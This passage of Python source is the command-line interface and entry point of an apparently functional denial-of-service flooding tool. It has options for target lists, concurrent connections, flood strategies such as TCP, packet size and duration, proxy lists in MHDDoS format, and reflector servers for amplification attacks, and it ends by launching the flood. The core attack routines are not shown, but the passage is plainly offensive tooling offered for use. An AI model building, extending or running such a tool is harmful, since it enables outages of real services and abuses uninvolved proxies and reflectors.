        help="File with the list of targets (target per line). Both local and remote files are supported."
    )
    parser.add_argument(
        "-c",
        "--concurrency",
        type=int,
        default=8,
        help="Total number of fibers (for TCP attacks means max number of open connections)"
    )
    parser.add_argument(
        "-s",
        "--strategy",
        default="TCP",
        choices=[s.upper() for s in default_strategies.keys()],
        help="Flood strategy to utilize"
    )
    parser.add_argument(
        "--rpc",
        type=int,
        default=100,
        help="Number of requests to be sent to each connection"
    )
    parser.add_argument(
        "--packet-size",
        type=int,
        default=1024,
        help="Packet size (in bytes)"
    )
    parser.add_argument(
        "-d",
        "--duration-seconds",
        type=int,
        default=10,
        help="How long to keep sending packets, in seconds"
    )
    parser.add_argument(
        "--proxies",
        nargs="*",
        help="List of proxy servers, separated by spaces (if many)"
    )
    parser.add_argument(
        "--proxies-config",
        type=str,
        default=None,
        help="File with a list of proxy servers (newline-delimited). Both local and remote files are supported."
    )
    parser.add_argument(
        "--proxy-providers-config",
        type=str,
        default=None,
        help="Configuration file with proxy providers (following MHDDoS configuration file format). Both local and remote files are supported."
    )
    parser.add_argument(
        "--reflectors-config",
        type=str,
        default=None,
        help="File with the list of reflector servers (IP per line). Only required for amplification attacks. Both local and remote files are supported."
    )
    parser.add_argument(
        "--log-level",
        default="INFO",
        choices=["DEBUG", "INFO", "ERROR", "WARN"],
        help="Log level (defaults to INFO)"
    )
    parser.add_argument(
        "--connection-timeout-seconds",
        type=int,
        default=10,
        help="Proxy connection timeout in seconds (default: 10s)"
    )
    args = parser.parse_args()

    if not args.targets and args.targets_config is None:
        raise ValueError("Targets list is empty and targets config is not provided")

    args.strategy = available_strategies[args.strategy.lower()]

    return args


def run():
    ctx = Context.from_args(parse_args(default_strategies))
    curio.run(flood(ctx))
    exit(0)


if __name__ == "__main__":
    run()
